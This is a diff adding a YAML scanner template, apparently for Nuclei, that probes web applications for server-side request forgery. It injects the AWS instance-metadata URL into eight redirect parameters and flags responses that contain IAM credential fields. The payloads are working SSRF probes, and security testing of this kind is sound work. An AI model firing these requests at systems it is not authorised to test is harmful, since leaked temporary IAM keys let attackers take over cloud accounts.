@@ -1,0 +1,30 @@
+id: aws-metadata-ssrf
+info:
+  name: SSRF via Redirecionamento para AWS Metadata Service
+  author: ingotus
+  severity: critical
+  description: >-
+    Parâmetros de redirecionamento aberto testados com o endpoint de metadata da AWS
+    (169.254.169.254). Se o servidor fizer a requisição, retorna credenciais IAM
+    temporárias (AccessKeyId, SecretAccessKey, Token) — impacto crítico de comprometimento.
+  tags: [ssrf, aws, metadata, iam, rce, critical]
+
+requests:
+  - method: GET
+    paths:
+      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?redirect=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?next=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?path=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?target=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?dest=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?return=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?open=http://169.254.169.254/latest/meta-data/"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["ami-id", "instance-id", "local-ipv4", "iam", "security-credentials", "AccessKeyId", "SecretAccessKey"]
+        condition: or
